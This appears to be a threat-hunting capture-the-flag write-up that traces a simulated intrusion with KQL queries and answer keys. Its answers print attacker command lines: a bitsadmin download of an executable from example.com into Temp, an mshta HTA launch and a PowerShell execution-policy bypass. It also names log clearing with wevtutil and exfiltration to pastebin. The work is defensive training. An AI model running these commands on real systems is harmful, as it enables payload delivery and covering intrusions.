 # 🎯 Threat-Hunting-Scenario-Lurker

 <img width="400" src="https://github.com/user-attachments/assets/834efe0f-4b99-4196-8f8a-9e7cc6b3551e" alt="computer login screen, person lurking"/>

**Participant:** Luka Groff

**Date:** 9 July 2025

## Platforms and Languages Leveraged

**Platforms:**

* Microsoft Defender for Endpoint (MDE)
* Log Analytics Workspace

**Languages/Tools:**

* Kusto Query Language (KQL) for querying device events, registry modifications, and persistence artifacts
* Native Windows utilities: `powershell.exe`, `cmd.exe`, `schtasks.exe`, `csc.exe`

---


 # 📖 **Scenario**
 
The last incident was supposed to be over. One machine compromised, the attacker cut off before they could spread — or so we were told.

But something doesn’t sit right.

A new device started acting strangely. At first glance, it mirrored the earlier compromise: same tools, same timing, same surgical precision. Only this time, the logs were cleaner. Too clean. And yet, traces remained — scattered like breadcrumbs that weren’t meant to be found, or perhaps were meant to be followed.

Someone wants us to see this.

What if the first breach was a smokescreen? A proof of concept? What if this is the real operation?

Some say it’s just a red team op. Others whisper it’s something more — a buried framework that’s been lying dormant, waiting for its second trigger.

You’ve been given full access. But not the full story.

🎯 Your job is simple: Prove what really happened.

🧭 Follow the signs. Trust the data. Question everything.

Good luck, hunter.



## Starting Point

Before you officially begin the flags, you must first determine where to start hunting. Identify where to start hunting with the following intel given: 
1. Days active 2-3 days
2. Executions from Temp folder
3. 15th of June

Identify the first machine to look at*

Query used:
```
DeviceProcessEvents
| where Timestamp between (datetime(2025-06-12T00:00:00Z) .. datetime(2025-06-19T00:00:00Z))
| where FolderPath contains "Temp"
| summarize FirstSeen=min(Timestamp), LastSeen=max(Timestamp), Count=count() by DeviceName
| project DeviceName, FirstSeen, LastSeen, ActiveDays = datetime_diff("day", LastSeen, FirstSeen), Count
| where ActiveDays >= 1 and ActiveDays <= 3
| order by FirstSeen asc
```

🧠 **Thought process:** Since the hint was 15th of June, my actual time is different, so I had to look for a machine on 15th of June UTC time. I extended the First seen timestamp to exclude the machines that were there before the 15th of June, I then checked the names and the first and last seen dates, and it led me to either michaelvm or employee- 1257. The rest were the usual names I am used to seeing in the logs.

<img width="600" src="https://github.com/user-attachments/assets/56e6b6a3-620c-4f35-845c-647c91fed247"/>

**Answer: michaelvm**

---

## 🟩 Flag 1 – Initial PowerShell Execution Detection

**Objective:**

Pinpoint the earliest suspicious PowerShell activity that marks the intruder's possible entry.

**What to Hunt:**

Initial signs of PowerShell being used in a way that deviates from baseline usage.

**Thought:**

Understanding where it all began helps chart every move that follows. Look for PowerShell actions that started the chain.

**Hint:**

1. File path

 🕵️ **Identify the first suspicious ps1 execution command**

Query used:
```
DeviceProcessEvents
| where DeviceName == "michaelvm"
| where ProcessCommandLine contains "ps1"
| project Timestamp, ProcessCommandLine, FileName, FolderPath
| order by Timestamp asc
```

🧠 **Thought process:** The hint of ps1 execution gave away a lot, as I just looked at the target machine's ps1 executions in the process command line that deviated from the usual noise creation. What I found was not just the answer to this flag, but also a clue for a future step, where the attacker migrated. The first execution was at 2025-06-16T05:38:07.9685093Z.

<img width="600" src="https://github.com/user-attachments/assets/f988216e-8ee9-4db4-9343-5916ab6e9560"/>

**Answer: "powershell.exe" -ExecutionPolicy Bypass -File "C:\Users\Mich34L_id\CorporateSim\Investments\Crypto\wallet_gen_0.ps1"**

---

## 🟩 Flag 2 – Reconnaissance Script Hash

**Objective:**

Identify reconnaissance stage binary.

**What to Hunt:**

Local recon indicators

**Thought:**

Recon always comes early — it’s the intruder mapping their new terrain.

 🕵️ **Identify the standard hashed value associated with the recon attempt**

Query used:
```
DeviceProcessEvents
| where DeviceName == "michaelvm"
| where ProcessCommandLine contains "whoami"
| project Timestamp, FileName, ProcessCommandLine, SHA256, FolderPath, InitiatingProcessFileName
| order by Timestamp asc
```

🧠 **Thought process:** I figured, since the first thing you do once you get remote access is type whoami, so I searched for that command in the command line. I found a command 'whoami' of which SHA256 was the right answer, BUT upon inspecting the SHA256 for actual clues of recon, I used the KQL below to find a lot of clues for example commands like whoami, schtasks, and deleting evidence of onedrivesetup. The evidence of the attacker being present was overwhelming.

```
DeviceProcessEvents
| where DeviceName == "michaelvm"
| where SHA256 == "badf4752413cb0cbdc03fb95820ca167f0cdc63b597ccdb5ef43111180e088b0"
| project Timestamp, ProcessCommandLine, FileName
| order by Timestamp asc
```

<img width="600" src="https://github.com/user-attachments/assets/b6231c78-0a03-4bd2-813b-ac7b9e82eb37"/>

**Answer: SHA256 = badf4752413cb0cbdc03fb95820ca167f0cdc63b597ccdb5ef43111180e088b0**

---

## 🟩 Flag 3 – Sensitive Document Access

**Objective:**

Reveal the document accessed/staged by attacker.

**What to Hunt:**

Access to meetings related directories or confidential crypto data.

**Thought:**

The attacker’s interest in financials reveals their motive — follow the money trail.

**Hint:**

1. Board

 🕵️ **Provide the targeted file**

Query used:
```
DeviceEvents
| where DeviceName == "michaelvm"
| where FolderPath contains "board"
| where ActionType == "SensitiveFileRead"
```

🧠 **Thought process:** I used the hint Board well in this case. I knew the SensitiveFileRead is a good way of finding out which file was accessed, if it was important. Then i tried to query the Board for file name and folder path as well as process command line, of which the last two were a good hit. 


<img width="600" src="https://github.com/user-attachments/assets/ec955588-e3cd-493a-8655-1ecc08fae16e"/>

**Answer: QuarterlyCryptoHoldings.docx**

---

## 🟩 Flag 4 – Last Manual Access to File

**Objective:**

Track last read of sensitive document.

**What to Hunt:**

Last file open timestamp.

**Thought:**

Late-stage access usually precedes exfiltration — timeline alignment matters.


 🕵️ **Identify the last instance of the file access**

Query used: Same as flag 3


🧠 **Thought process:** From the results seen in flag 3, I got the Timestamp of the last file access.


<img width="600" src="https://github.com/user-attachments/assets/ec955588-e3cd-493a-8655-1ecc08fae16e"/>

**Answer: 2025-06-16T06:12:28.2856483Z**

---

## 🟩 Flag 5 – LOLBin Usage: bitsadmin

**Objective:**

Identify stealth download via native tools.

**What to Hunt:**

bitsadmin.exe with file transfer URL.

**Thought:**

Abusing trusted binaries helps attackers blend in — keep an eye on LOLBins.


 🕵️ **Provide the command value associated with the initial exploit**

Query used:

```
DeviceProcessEvents
| where DeviceName == "michaelvm"
| where Timestamp between (datetime(2025-06-15T00:00:00Z) .. datetime(2025-06-17T00:00:00Z))
| where FileName contains "bitsadmin.exe"
| order by Timestamp asc
```

🧠 **Thought process:** I simply followed the hint and I got a straight answer in the logs.

<img width="250" src="https://github.com/user-attachments/assets/fd161361-da91-49b7-b3b6-10a559c48896"/>

**Answer: "bitsadmin.exe" /transfer job1 https://example.com/crypto_toolkit.exe C:\Users\MICH34~1\AppData\Local\Temp\market_sync.exe**

---

## 🟩 Flag 6 – Suspicious Payload Deployment

**Objective:**

Identify dropped executable payloads that do not align with baseline software.

**What to Hunt:**

New files placed in Temp or uncommon locations, especially with misleading names.

**Thought:**

Payloads must land before they run. Watch Temp folders for staging signs.

**Hint:**

1. Book of financial accounts

 🕵️ **Identify the suspicious program**

Query used:

```
DeviceFileEvents
| where DeviceName == "michaelvm"
| where Timestamp between (datetime(2025-06-15T00:00:00Z) .. datetime(2025-06-17T00:00:00Z))
| where FileName endswith ".exe"
| where FolderPath has_any ("\\Temp\\", "\\AppData\\", "\\ProgramData\\", "\\Users\\Public\\")
| project Timestamp, FileName, FolderPath, SHA256, InitiatingProcessFileName, InitiatingProcessCommandLine
| order by Timestamp asc
```

🧠 **Thought process:** I sorted the results by file name, that way it was easy to sift through the results and find the odd one out.

<img width="400" src="https://github.com/user-attachments/assets/8f2dce56-934b-4bd4-95b2-32f67088554c"/>

**Answer: ledger_viewer.exe**

---

## 🟩 Flag 7 – HTA Abuse via LOLBin

**Objective:**

Detect execution of HTML Application files using trusted Windows tools.

**What to Hunt:**

Execution via `mshta.exe` pointing to local HTA scripts.

**Thought:**

HTA-based execution is a social engineering favorite — it leverages trust and native execution.

 🕵️ **Provide the value of the command associated with the exploit**

Query used:

```
DeviceProcessEvents
| where DeviceName == "michaelvm"
| where Timestamp between (datetime(2025-06-15T00:00:00Z) .. datetime(2025-06-17T00:00:00Z))
| where FileName =~ "mshta.exe"
| where ProcessCommandLine has ".hta"
| project Timestamp, ProcessCommandLine, InitiatingProcessFileName, FolderPath, SHA256
| order by Timestamp asc
```

🧠 **Thought process:** The hints were good enough for me to find the results directly, where file name was mshta.exe and command line having .hta extensions

<img width="600" src="https://github.com/user-attachments/assets/a0c40640-28f7-45bc-9314-2a502cfef238"/>

**Answer: "mshta.exe" C:\Users\MICH34~1\AppData\Local\Temp\client_update.hta**

---

## 🟩 Flag 8 – ADS Execution Attempt

**Objective:**

Track if attackers stored payloads in Alternate Data Streams (ADS).

**What to Hunt:**

DLLs hidden in common file types like `.docx` with `:hidden.dll` behavior.

**Thought:**

ADS hides in plain sight — it’s a classic LOLBin trick to store malware where few would look.

**Hint:**

1. Capitalist

 🕵️ **Provide the SHA1 value associated**

Query used:

```
DeviceProcessEvents
| where DeviceName == "michaelvm"
| where Timestamp between (datetime(2025-06-15) .. datetime(2025-06-19))
| where InitiatingProcessCommandLine has ":"
| where InitiatingProcessCommandLine has ".dll"
| project Timestamp, DeviceName, InitiatingProcessFileName, InitiatingProcessCommandLine, SHA1
| order by Timestamp desc
```

🧠 **Thought process:** I filtered for the command line having ":" and ".dll" in it, according to the hint. The compattelrunner.exe sounds like Capitalist so I figures it's the answer which is was. Upon further inspection into the command, I could see that Write-Host 'Final result: 1' command was run before the compattelrunner.exe scan. It's faking the result of a scan — potentially to mimic a real system check or mislead defenders. Then, the second command does the actual .inf scan. This staged behavior is often seen in malware to print fake result (decoy), actually scan system or possibly drop drivers or persistence tools.

<img width="400" src="https://github.com/user-attachments/assets/97c83a1b-8bcc-4b15-ab39-c49512c362cd"/>

**Answer: 801262e122db6a2e758962896f260b55bbd0136a**

---

## 🟩 Flag 9 – Registry Persistence Confirmation

**Objective:**

Confirm that persistence was achieved via registry autorun keys.

**What to Hunt:**

Registry path and value that re-executes the attack script.

**Thought:**

Once in the registry, an attacker can survive reboots — making this a prime persistence marker.

 🕵️ **Provide the value of the registry tied to this particular exploit**

Query used:

```
DeviceRegistryEvents
| where DeviceName == "michaelvm"
| where RegistryKey endswith @"CurrentVersion\Run"
     or RegistryKey endswith @"CurrentVersion\RunOnce"
| project Timestamp, DeviceName, RegistryKey, RegistryValueName, RegistryValueData, InitiatingProcessFileName, InitiatingProcessCommandLine
| order by Timestamp desc
```

🧠 **Thought process:** I just looked for commands Run or RunOnce within the RegistryKey where these persistence methods usually are, and it gave me the answer.

<img width="800" src="https://github.com/user-attachments/assets/d6ceceae-d855-4dc6-a1ce-4f929e5e9dca"/>

**Answer: HKEY_CURRENT_USER\S-1-5-21-2654874317-2279753822-948688439-500\SOFTWARE\Microsoft\Windows\CurrentVersion\Run**

---

## 🟩 Flag 10 – Scheduled Task Execution

**Objective:**

Validate the scheduled task that launches the payload.

**What to Hunt:**

Name of the task tied to the attack’s execution flow.

**Thought:**

Even if stealthy, scheduled tasks leave clear creation trails. Look for unfamiliar task names.

 🕵️ **What is the name of the scheduled task created**

Query used:

```
DeviceProcessEvents
| where DeviceName == "michaelvm"
| where FileName =~ "schtasks.exe" and ProcessCommandLine has "/create"
| project Timestamp, DeviceName, ProcessCommandLine, InitiatingProcessFileName
| order by Timestamp asc
```

🧠 **Thought process:** I looked for scheduled tasks and found what I was looking for and more.

<img width="800" src="https://github.com/user-attachments/assets/7af9ea77-36a4-48c3-8bfc-17522bb10838"/>

**Answer: MarketHarvestJob**

---

## 🟩 Flag 11 – Target of Lateral Movement

**Objective:**

Identify the remote machine the attacker pivoted to next.

**What to Hunt:**

Remote system name embedded in command-line activity.

**Thought:**

The attack is expanding. Recognizing lateral targets is key to containment.

 🕵️ **Drop the next compromised machine name**

Query used: same as flag 10

🧠 **Thought process:** In the previous flag I spotted lateral movement to a different machine as a scheduled task. I also noticed it at flag 2 where I looked into the SHA256.

<img width="800" src="https://github.com/user-attachments/assets/7af9ea77-36a4-48c3-8bfc-17522bb10838"/>

**Answer: centralsrvr**

---

## 🟩 Flag 12 – Lateral Move Timestamp

**Objective:**

Pinpoint the exact time of lateral move to the second system.

**What to Hunt:**

Execution timestamps of commands aimed at the new host.

**Thought:**

Timing matters — it allows us to reconstruct the attack window on the second host.

 🕵️ **When was the last lateral execution?**

Query used:

```
DeviceProcessEvents
| where DeviceName == "michaelvm"
| where ProcessCommandLine has "C2.ps1"
```

🧠 **Thought process:** From the previous flag, I gathered enough evidence to jump directly to the lateral movement execution with the above query.

<img width="250" src="https://github.com/user-attachments/assets/67306d9b-279b-45a5-83a1-df6a47c916c1"/>

**Answer: 2025-06-17T03:00:49.525038Z**

---

## 🟩 Flag 13 – Sensitive File Access

**Objective:**

Reveal which specific document the attacker was after.

**What to Hunt:**

Verify if the attackers were after a similar file

**Thought:**

The goal is rarely just control — it’s the data. Identifying what they wanted is vital.

**Hint:**

1. Utilize previous findings

 🕵️ **Provide the standard hash value associated with the file**

Query used:

```
DeviceFileEvents
| where DeviceName == "centralsrvr"
| where FileName == "QuarterlyCryptoHoldings.docx"
| project Timestamp, FileName, SHA256, FolderPath, InitiatingProcessFileName
```

🧠 **Thought process:** I assumed, according to the hint, that the file they were after was the same one as in flag 3, so I jumped directly to that file and got the SHA256 of the QuarterlyCryptoHoldings.docx file.

<img width="400" src="https://github.com/user-attachments/assets/58ec4895-d925-4468-b5b2-9c5109d7ffac"/>

**Answer: b4f3a56312dd19064ca89756d96c6e47ca94ce021e36f818224e221754129e98**

---

## 🟩 Flag 14 – Data Exfiltration Attempt

**Objective:**

Validate outbound activity by hashing the process involved.

**What to Hunt:**

Process hash related to exfiltration to common outbound services.

**Thought:**

Exfil isn’t just about the connection — process lineage shows who initiated the theft.

 🕵️ **Provide the associated MD5 value of the exploit**

Query used:

```
DeviceNetworkEvents
| where DeviceName == "centralsrvr"
| where RemoteIPType == "Public"
| where RemoteUrl != ""
| where InitiatingProcessCommandLine contains "exfiltrate"
| project Timestamp, RemoteUrl, RemoteIP, InitiatingProcessFileName, InitiatingProcessCommandLine, InitiatingProcessMD5
```

🧠 **Thought process:** This flag was a little bit of a challenge, but I sifted through a lot of files throughout the hunt, where I found some exfiltratedata.ps1 executables, but was not sure if it was there for just noise or to throw me off. I played around with the KQL to lower the amount of logs shown and found that the above-mentioned executable was actually the one responsible for exfiltration.

<img width="600" src="https://github.com/user-attachments/assets/cb9dd4b7-2e56-47c9-b6fb-09e902e1fcf6"/>

**Answer: 2e5a8590cf6848968fc23de3fa1e25f1**

---

## 🟩 Flag 15 – Destination of Exfiltration

**Objective:**

Identify final IP address used for data exfiltration.

**What to Hunt:**

Remote IPs of known unauthorized cloud services.

**Thought:**

Knowing where data went informs response and informs IR/containment scope.

 🕵️ **Identify the IP of the last outbound connection attempt**

Query used:

```
DeviceNetworkEvents
| where DeviceName == "centralsrvr"
| where RemoteIPType == "Public"
| where RemoteUrl != ""
| where RemoteUrl in~ (
   "drive.google.com",
   "dropbox.com",
   "www.dropbox.com",
   "pastebin.com",
   "dw8wjz3q0i4gj.cloudfront.net",
   "o.ss2.us"
)
| project Timestamp, DeviceName, InitiatingProcessCommandLine, RemoteUrl, RemoteIP, InitiatingProcessSHA256
| sort by Timestamp desc
```

🧠 **Thought process:** I filtered for the remote URLs that I noticed could be a third-party unauthorized cloud service, and I only had 4 IPs to choose from, and in the end, it was the IP of pastebin.com

<img width="600" src="https://github.com/user-attachments/assets/4db9f414-56df-4e73-b30c-cd5d664bae8d"/>

**Answer: 104.22.69.199**

---

## 🟩 Flag Flag 16 – PowerShell Downgrade Detection

**Objective:**

Spot PowerShell version manipulation to avoid logging.

**What to Hunt:**

`-Version 2` execution flag in process command lines.

**Thought:**

This signals AMSI evasion — it’s a red flag tactic to bypass modern defenses.

 🕵️ **When was a downgrade attempt executed?**

Query used:

```
DeviceProcessEvents
| where DeviceName == "centralsrvr"
| where ProcessCommandLine contains "-Version 2"
```

🧠 **Thought process:** This was a pretty straightforward flag since the hints gave away what to look for. Once I queried the -Version 2 in the process command line, I had my answer.

<img width="300" src="https://github.com/user-attachments/assets/a501e571-2329-48cf-8df4-edbbb27855ef"/>

**Answer: 2025-06-18T10:52:59.0847063Z**

---

## 🟩 Flag 17 – Log Clearing Attempt

**Objective:**

Catch attacker efforts to cover their tracks.

**What to Hunt:**

Use of `wevtutil cl Security` to clear event logs.

**Thought:**

Cleaning logs shows intent to persist without a trace — it's often one of the final steps before attacker exit.

 🕵️ **Identify the process creation date**

Query used:

```
DeviceProcessEvents
| where DeviceName == "centralsrvr"
| where ProcessCommandLine has_any ("wevtutil", "cl Security")
```

🧠 **Thought process:** The last flag was, at a glance, very simple, but it had a little twist to it. I found what I was looking for immediately, but I had trouble giving in the right time. The question was set as "identifying the process creation time" and not just a Timestamp. At a glance, these two times look the same, so I always just posted the Timestamp time, but after countless hours of questioning myself, I realized what the question is actually asking for.

<img width="250" src="https://github.com/user-attachments/assets/460a7771-351e-4171-9ef6-dbf9118880ad"/>

**Answer: 2025-06-18T10:52:33.3030998Z**

---

✅ Conclusion
The attacker leveraged native tools and LOLBins to evade detection, accessed high-value documents, and stealthily exfiltrated them while maintaining persistence. The clean logs indicate deliberate obfuscation and anti-forensic effort.

🛡️ Recommendations
	•	Block LOLBins like bitsadmin, mshta via AppLocker or WDAC
	•	Enable script block logging and AMSI
	•	Monitor for PowerShell downgrade attempts (-Version 2)
	•	Watch for registry changes in autorun paths
	•	Alert on suspicious scheduled task creation
	•	Monitor public cloud uploads (e.g. Dropbox, Pastebin)


“Attackers hide in noise. But sometimes, they hide in silence.”
